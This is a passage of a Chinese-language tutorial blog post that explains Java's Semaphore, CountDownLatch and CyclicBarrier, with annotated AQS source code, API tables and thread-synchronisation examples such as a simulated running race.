class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                semaphore.acquire();</span><br><span class="line">                System.out.println(Thread.currentThread().getName() + <span class="string">&quot;semaphore.acquire(1);&quot;</span>);</span><br><span class="line">                Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                semaphore.release();</span><br><span class="line">                System.out.println(Thread.currentThread().getName() + <span class="string">&quot;release();&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">Thread1</span>()).start();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从打印结果可以看出，一次只有两个线程执行 acquire()，只有线程进行 release() 方法后才会有别的线程执行 acquire()。</p>
<h1 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h1><p><code>Semaphore</code>也是基于AQS框架实现的一种共享式锁，因此它的实现流程和<code>ReentrantLock</code>类似。</p>
<h2 id="Acquire"><a href="#Acquire" class="headerlink" title="Acquire"></a>Acquire</h2><p>本文以公平锁为例，之前我们介绍了<code>ReentrantLock</code>公平锁的详细原理，它的<strong>独占式</strong>是依靠状态量<code>state</code>来实现的，当<code>state=0</code>时，表示资源空闲；当<code>state&gt;0</code>时表示资源被占用。</p>
<p>而<code>Semaphore</code>这种<strong>共享式</strong>锁的实现同样是依靠<code>state</code>来实现，但是与前者相反：当<code>state=0</code>时，表示资源已被用完；当<code>state=n(n&gt;0)</code>时，表示剩余资源数为n。</p>
<p>而两者对于获取资源失败，需要被阻塞的线程的处理相似，它们都会被加入CLH队列中等待唤醒。只是共享式锁同时可以有多个线程占用资源。下面我们就来看看源码。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">acquire</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">    <span class="comment">//信号量减一</span></span><br><span class="line">    sync.acquireSharedInterruptibly(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">acquireSharedInterruptibly</span><span class="params">(<span class="type">int</span> arg)</span></span><br><span class="line">        <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">    <span class="comment">//如果有中断信号</span></span><br><span class="line">    <span class="keyword">if</span> (Thread.interrupted())</span><br><span class="line">        <span class="comment">//抛出中断异常</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InterruptedException</span>();</span><br><span class="line">    <span class="comment">//尝试获取信号量</span></span><br><span class="line">    <span class="comment">//如果减少后的信号量小于0才进行后续操作</span></span><br><span class="line">    <span class="comment">//否则就直接返回了！！！</span></span><br><span class="line">    <span class="keyword">if</span> (tryAcquireShared(arg) &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="comment">//加入阻塞队列</span></span><br><span class="line">        doAcquireSharedInterruptibly(arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="type">int</span> <span class="title function_">tryAcquireShared</span><span class="params">(<span class="type">int</span> acquires)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="keyword">if</span> (hasQueuedPredecessors())</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="comment">//获取状态</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">available</span> <span class="operator">=</span> getState();</span><br><span class="line">        <span class="comment">//信号量变化</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">remaining</span> <span class="operator">=</span> available - acquires;</span><br><span class="line">        <span class="comment">//如果信号量不够，那么直接返回</span></span><br><span class="line">        <span class="comment">//如果信号量够，那么CAS操作</span></span><br><span class="line">        <span class="comment">//最后都是返回减少后的信号量</span></span><br><span class="line">        <span class="keyword">if</span> (remaining &lt; <span class="number">0</span> ||</span><br><span class="line">            compareAndSetState(available, remaining))</span><br><span class="line">            <span class="keyword">return</span> remaining;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">doAcquireSharedInterruptibly</span><span class="params">(<span class="type">int</span> arg)</span></span><br><span class="line">    <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">    <span class="comment">//首先加入CLH队列中</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">Node</span> <span class="variable">node</span> <span class="operator">=</span> addWaiter(Node.SHARED);</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">failed</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">//尝试阻塞线程</span></span><br><span class="line">        <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">            <span class="comment">//前置节点</span></span><br><span class="line">            <span class="keyword">final</span> <span class="type">Node</span> <span class="variable">p</span> <span class="operator">=</span> node.predecessor();</span><br><span class="line">            <span class="comment">//如果本线程的前节点是头节点</span></span><br><span class="line">            <span class="comment">//说明本线程是队列中第一个</span></span><br><span class="line">            <span class="keyword">if</span> (p == head) &#123;</span><br><span class="line">                <span class="comment">//尝试获取信号量</span></span><br><span class="line">                <span class="type">int</span> <span class="variable">r</span> <span class="operator">=</span> tryAcquireShared(arg);</span><br><span class="line">                <span class="comment">//如果返回值大于=0</span></span><br><span class="line">                <span class="comment">//说明当前信号量是够的！</span></span><br><span class="line">                <span class="comment">//这里是因为CAS操作在tryAcquireShared</span></span><br><span class="line">                <span class="comment">//所以返回的值是可以确定本线程是否拿取这个信号量！</span></span><br><span class="line">                <span class="keyword">if</span> (r &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="comment">//把本线程节点设置未头节点</span></span><br><span class="line">                    setHeadAndPropagate(node, r);</span><br><span class="line">                    <span class="comment">//把头节点的地方抛弃 协助GC</span></span><br><span class="line">                    p.next = <span class="literal">null</span>; <span class="comment">// help GC</span></span><br><span class="line">                    failed = <span class="literal">false</span>;</span><br><span class="line">                    <span class="comment">//此时本线程获取了信号量，从CLH队列中释放</span></span><br><span class="line">                    <span class="comment">//完成了所有操作</span></span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//如果本线程节点不是第一个线程节点</span></span><br><span class="line">            <span class="comment">//那么尝试阻塞本线程</span></span><br><span class="line">            <span class="comment">//首先更改前节点的waitStatus</span></span><br><span class="line">            <span class="keyword">if</span> (shouldParkAfterFailedAcquire(p, node) &amp;&amp;</span><br><span class="line">                <span class="comment">//进行阻塞处理</span></span><br><span class="line">                parkAndCheckInterrupt())</span><br><span class="line">                <span class="comment">//如果被唤醒，可能是由于被中断或者被主动唤醒</span></span><br><span class="line">                <span class="comment">//被中断唤醒的话，if判断未true</span></span><br><span class="line">                <span class="comment">//那么抛出异常</span></span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InterruptedException</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="comment">//被中断唤醒的话，failed是true</span></span><br><span class="line">        <span class="comment">//导致对CLH队列中进行删除处理！</span></span><br><span class="line">        <span class="keyword">if</span> (failed)</span><br><span class="line">            cancelAcquire(node);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可用看到和<code>ReetrantLock</code>的流程较为相似，主要就是分为三步：</p>
<ul>
<li>尝试获取锁：获取共享锁时对于<code>state</code>的操作做减法，如果小于0说明资源数量不够，获取失败</li>
<li>获取失败后入队阻塞：获取锁失败后需要加入CLH队列排队，不过加入之前同样存在自旋操作</li>
<li>获取锁成功后唤醒线程：这也是与独占式锁的最大不同之处，在共享模式下，一旦一个阻塞线程被唤醒并且成功获取共享资源后，它还会唤醒CLH队列中的其他线程。</li>
</ul>
<h3 id="Release"><a href="#Release" class="headerlink" title="Release"></a>Release</h3><p>释放资源的流程相对来说比较简单，主要就是归还资源，即修改<code>state</code>的值和唤醒其它线程。Semaphore类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 一.开始释放信号量</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">release</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 调用AQS的releaseShared</span></span><br><span class="line">    sync.releaseShared(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Semaphore的内部类FairSync</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">FairSync</span> <span class="keyword">extends</span> <span class="title class_">Sync</span> &#123; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// 四.尝试释放信号量的方法</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">tryReleaseShared</span><span class="params">(<span class="type">int</span> releases)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">            <span class="comment">// 获取当前资源状态</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">current</span> <span class="operator">=</span> getState();</span><br><span class="line">            <span class="comment">// 归还资源</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">next</span> <span class="operator">=</span> current + releases;</span><br><span class="line">            <span class="keyword">if</span> (next &lt; current)</span><br><span class="line">                <span class="comment">// 归还后如果比当前还少，说明有异常</span></span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;Maximum permit count exceeded&quot;</span>);</span><br><span class="line">            <span class="comment">// 归还成功后通过CAS修改资源状态</span></span><br><span class="line">            <span class="keyword">if</span> (compareAndSetState(current, next))</span><br><span class="line">                <span class="comment">// 资源状态修改成功则表示释放成功，否则自旋</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>AbstractQueuedSynchronizer类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 二.释放信号量</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">releaseShared</span><span class="params">(<span class="type">int</span> arg)</span> &#123;</span><br><span class="line">    <span class="comment">// 调用tryReleaseShared方法尝试释放</span></span><br><span class="line">    <span class="keyword">if</span> (tryReleaseShared(arg)) &#123;</span><br><span class="line">        <span class="comment">// 如果释放成功，调用doReleaseShared方法</span></span><br><span class="line">        doReleaseShared();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 三.尝试释放信号量，由子类实现</span></span><br><span class="line"><span class="keyword">protected</span> <span class="type">boolean</span> <span class="title function_">tryReleaseShared</span><span class="params">(<span class="type">int</span> arg)</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnsupportedOperationException</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="CountDownLatch"><a href="#CountDownLatch" class="headerlink" title="CountDownLatch"></a>CountDownLatch</h1><h2 id="什么是CountDownLatch"><a href="#什么是CountDownLatch" class="headerlink" title="什么是CountDownLatch"></a>什么是CountDownLatch</h2><p>CountDownLatch这个类能够使一个线程等待其他线程完成各自的工作后再执行。</p>
<p>例如，应用程序的主线程希望在负责启动框架服务的线程已经启动所有的框架服务之后再执行。在Zookeeper分布式锁，Jmeter模拟高并发等场景中被使用。 它的原理也很简单：</p>
<p>CountDownLatch是通过一个计数器来实现的，计数器的初始值为线程的数量。每当一个线程完成了自己的任务后，计数器的值就会减1。当计数器值到达0时，它表示所有的线程已经完成了任务，然后在闭锁上等待的线程就可以恢复执行任务。</p>
<h2 id="怎么使用CountDownLatch"><a href="#怎么使用CountDownLatch" class="headerlink" title="怎么使用CountDownLatch"></a>怎么使用CountDownLatch</h2><h3 id="API"><a href="#API" class="headerlink" title="API"></a>API</h3><ul>
<li>构造方法</li>
</ul>
<table>
<thead>
<tr>
<th>方法</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>CountDownLatch(int count)</td>
<td>count表示CountDownLatch的初始值</td>
</tr>
</tbody></table>
<ul>
<li>计数值操作</li>
</ul>
<table>
<thead>
<tr>
<th>方法</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>countDown()</td>
<td>计数值减1</td>
</tr>
<tr>
<td>getCount()</td>
<td>获取当前计数值</td>
</tr>
</tbody></table>
<ul>
<li>等待方法</li>
</ul>
<table>
<thead>
<tr>
<th>方法</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>await()</td>
<td>等待计数值为0</td>
</tr>
<tr>
<td>await(long timeout, TimeUnit unit)</td>
<td>等待计数值为0，超过timeout时长返回false</td>
</tr>
</tbody></table>
<h3 id="案例一"><a href="#案例一" class="headerlink" title="案例一"></a>案例一</h3><p>CountDownLatch这个类能够使一个线程等待其他线程完成各自的工作后再执行，我们模拟一个这样的场景：我们处理大量数据时，将数据进行分块处理，安排多个线程同时处理不同块的数据；而主线程需要等待所有的数据处理完后，再进行数据的总体分析。代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CountDownLaunchTest1</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建countDownLatch，初始计数值为3</span></span><br><span class="line">    <span class="keyword">static</span> <span class="type">CountDownLatch</span> <span class="variable">countDownLatch</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CountDownLatch</span>(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 创建3个线程启动，模拟处理3块数据</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= <span class="number">3</span>; i++) &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Task</span>(i).start();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 等待3个线程执行完毕</span></span><br><span class="line">            countDownLatch.await();</span><br><span class="line">            System.out.println(<span class="string">&quot;所有数据都处理完了，开始总体分析&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 分块处理数据的线程类</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Task</span> <span class="keyword">extends</span> <span class="title class_">Thread</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 数据的块号</span></span><br><span class="line">        <span class="keyword">private</span> <span class="type">int</span> id;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">Task</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.id = id;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;处理第&quot;</span> + id + <span class="string">&quot;块数据&quot;</span>);</span><br><span class="line">                <span class="comment">// 模拟数据处理时间</span></span><br><span class="line">                TimeUnit.SECONDS.sleep(id);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                <span class="comment">// 数据处理完后，计数值减1</span></span><br><span class="line">                countDownLatch.countDown();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个还是比较容易理解的，每个线程执行完毕后将计数值减1，主线程等待计数值为0时就可以从<code>await()</code>开始继续执行了。</p>
<p>当然也可以使用带有超时时长的<code>await()</code>方法进行处理。</p>
<p>另外通过<code>thread.join()</code>方法也可以实现这一的需求，<code>join()</code>方法就是等待该线程执行完成后才会继续往下执行，但是如果线程很多的话写起来相对比较麻烦。</p>
<h3 id="案例二"><a href="#案例二" class="headerlink" title="案例二"></a>案例二</h3><p>CountDownLatch本身就有倒计时的意思，因此它也有让所有线程同时开始某个操作的功能。我们就模拟一场跑步比赛，所有运动员准备就绪后，听到裁判的哨声后才能同时启动。代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CountDownLaunchTest2</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建countDownLatch，初始计数值为1，模拟裁判</span></span><br><span class="line">    <span class="keyword">static</span> <span class="type">CountDownLatch</span> <span class="variable">countDownLatch</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CountDownLatch</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 创建5个运动员跑步</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= <span class="number">5</span>; i++) &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Athlete</span>(i).start();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 保证所有运动员都准备好</span></span><br><span class="line">            Thread.sleep(<span class="number">2000</span>);</span><br><span class="line">            <span class="comment">// 裁判吹哨</span></span><br><span class="line">            System.out.println(<span class="string">&quot;嘟！&quot;</span>);</span><br><span class="line">            countDownLatch.countDown();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//运动员</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Athlete</span> <span class="keyword">extends</span> <span class="title class_">Thread</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 运动员编号</span></span><br><span class="line">        <span class="keyword">private</span> <span class="type">int</span> id;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">Athlete</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.id = id;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 运动员准备就绪</span></span><br><span class="line">                System.out.println(<span class="string">&quot;运动员&quot;</span> + id + <span class="string">&quot;号准备就绪！&quot;</span>);</span><br><span class="line">                <span class="comment">// 等待裁判哨声</span></span><br><span class="line">                countDownLatch.await();</span><br><span class="line">                <span class="comment">// 运动员启动</span></span><br><span class="line">                System.out.println(<span class="string">&quot;运动员&quot;</span> + id + <span class="string">&quot;号启动！&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个案例非常形象，相信大家一看就懂，将<code>CountDownLatch</code>的初值设置为1，所有运动员准备就绪后<code>await()</code>裁判的哨声，裁判吹哨后<code>countDown</code>将计数值减为0，这时五个线程可用同时继续执行下面的代码。</p>
<p>如果说案例一是等待多个线程同时完成，本案例则是等待多个线程同时开始，大家注意区别两个案例中<code>CountDownLatch</code>方法的使用顺序。</p>
<h1 id="CyclicBarrier"><a href="#CyclicBarrier" class="headerlink" title="CyclicBarrier"></a>CyclicBarrier</h1><h2 id="什么是CyclicBarrier"><a href="#什么是CyclicBarrier" class="headerlink" title="什么是CyclicBarrier"></a>什么是CyclicBarrier</h2><p>CyclicBarrier表示周期屏障，让一组线程到达一个屏障（也可以叫同步点）时被阻塞，直到最后一个线程到达屏障时，屏障才会开门，所有被屏障拦截的线程才会继续运行。</p>
<h2 id="怎么使用CyclicBarrier"><a href="#怎么使用CyclicBarrier" class="headerlink" title="怎么使用CyclicBarrier"></a>怎么使用CyclicBarrier</h2><h3 id="API-1"><a href="#API-1" class="headerlink" title="API"></a>API</h3><ul>
<li>构造方法</li>
</ul>
<table>
<thead>
<tr>
<th>方法</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>CyclicBarrier(int parties)</td>
<td>parties是屏障的初值，每个线程到达后值减1</td>
</tr>
<tr>
<td>CyclicBarrier(int parties, Runnable barrierAction)</td>
<td>barrierAction表示通过屏障后，优先执行barrierAction，方便处理更复杂的业务场景</td>
</tr>
</tbody></table>
<ul>
<li>等待方法</li>
</ul>
<table>
<thead>
<tr>
<th>方法</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>await()</td>
<td>等待规定数量的线程到达屏障</td>
</tr>
<tr>
<td>await(long timeout, TimeUnit unit)</td>
<td>等待规定数量的线程到达屏障，超过timeout时长返回false</td>
</tr>
</tbody></table>
<ul>
<li>其他</li>
</ul>
<table>
<thead>
<tr>
<th>方法</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>reset()</td>
<td>重置CyclicBarrier，从0开始重新计数</td>
</tr>
<tr>
<td>getNumberWaiting()</td>
<td>获取正在等待的线程数量</td>
</tr>
</tbody></table>
<h3 id="案例一-1"><a href="#案例一-1" class="headerlink" title="案例一"></a>案例一</h3><p>大概了解了<code>CyclicBarrier</code>的作用，大家首先想到案例肯定是之前的跑步比赛案例了，这次我们用<code>CyclicBarrier</code>实现跑步比赛的场景。代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CyclicBarrierTest1</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建cyclicBarrier，初始计数值为5</span></span><br><span class="line">    <span class="keyword">static</span> <span class="type">CyclicBarrier</span> <span class="variable">cyclicBarrier</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CyclicBarrier</span>(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 创建5个运动员跑步</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= <span class="number">5</span>; i++) &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Athlete</span>(i).start();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//运动员</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Athlete</span> <span class="keyword">extends</span> <span class="title class_">Thread</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 运动员编号</span></span><br><span class="line">        <span class="keyword">private</span> <span class="type">int</span> id;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">Athlete</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.id = id;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 运动员准备就绪</span></span><br><span class="line">                System.out.println(<span class="string">&quot;运动员&quot;</span> + id + <span class="string">&quot;号准备就绪！&quot;</span>);</span><br><span class="line">                <span class="comment">// 等待所有运动员就绪</span></span><br><span class="line">                cyclicBarrier.await();</span><br><span class="line">                <span class="comment">// 运动员启动</span></span><br><span class="line">                System.out.println(<span class="string">&quot;运动员&quot;</span> + id + <span class="string">&quot;号启动！&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这次和之前的<code>CountDownLatch</code>中的案例稍有不同，本案例中我们没有裁判，而是等所有线程都到达屏障后立刻同时启动。</p>
<h3 id="案例二-1"><a href="#案例二-1" class="headerlink" title="案例二"></a>案例二</h3><p>同样，我们用<code>CyclicBarrier</code>来实现之前的数据处理案例，即等待所有分块数据处理完后才能对总体数据进行分析：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CyclicBarrierTest2</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建cyclicBarrier，初始计数值为3，模拟3块数据</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">CyclicBarrier</span> <span class="variable">cyclicBarrier</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CyclicBarrier</span>(<span class="number">3</span>, <span class="built_in">this</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 所有数据分析完后，总体分析</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;所有数据处理完毕,开始总体分析&quot;</span>);</span><br><span class="line">        <span class="comment">// 分析完后重置cyclicBarrier</span></span><br><span class="line">        cyclicBarrier.reset();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 分块处理数据的线程类</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Task</span> <span class="keyword">extends</span> <span class="title class_">Thread</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 数据的块号</span></span><br><span class="line">        <span class="type">int</span> id;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">Task</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.id = id;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;处理第&quot;</span> + id + <span class="string">&quot;块数据&quot;</span>);</span><br><span class="line">                <span class="comment">// 模拟数据处理时间</span></span><br><span class="line">                TimeUnit.SECONDS.sleep(id);</span><br><span class="line">                <span class="comment">// 内存屏障，等待所有数据块都处理完毕</span></span><br><span class="line">                cyclicBarrier.await();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 创建3个线程启动，模拟处理3块数据</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">analyse</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= <span class="number">3</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Task</span>(i).start();</span><br><span class="line">        &#125;</span><br><span 